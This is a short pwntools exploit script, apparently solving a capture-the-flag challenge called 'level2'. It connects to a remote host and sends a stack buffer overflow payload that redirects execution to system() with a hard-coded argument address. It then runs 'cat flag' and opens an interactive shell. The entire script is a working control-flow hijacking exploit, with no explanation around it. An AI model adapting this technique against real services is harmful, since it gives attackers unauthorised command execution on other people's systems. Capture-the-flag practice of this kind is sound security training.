from pwn import *
elf = ELF('level2')
#p = process("./level2")
host,port = '111.200.241.244',64522
p = remote(host,port)

bin = 0x804a024
sys = 0x8048320
exploit = "A"*0x88+p32(1)+p32(sys)+p32(1)+p32(bin)
p.sendline(exploit)
p.sendline("cat flag")
p.interactive()
